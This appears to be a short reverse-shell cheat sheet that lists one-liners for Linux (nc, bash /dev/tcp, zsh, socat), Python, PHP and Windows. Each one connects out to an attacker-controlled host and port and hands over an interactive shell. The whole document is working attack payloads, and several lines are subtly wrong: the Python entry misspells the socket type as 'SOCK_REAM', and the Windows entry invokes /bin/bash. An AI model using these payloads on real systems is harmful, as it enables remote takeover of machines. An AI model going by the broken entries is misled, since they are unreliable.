> Linux
```sh
nc -e /bin/bash 1.3.3.7 4444
bash -c 'bash -i >/dev/tcp/1.3.3.7/4444 0>&1'
zsh -c 'zmodload zsh/net/tcp && ztcp 1.3.3.7 4444 && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:1.3.3.7:4444  

```

> python
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_REAM);s.connect(("127.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

> php
```php
php -r '$sock=fsockopen("your_ip","4444");exec("/bin/sh -i <&3 >&3 2>&3");'
```

> windows
```sh
nc.exe -e /bin/bash 1.3.3.7 4444
```

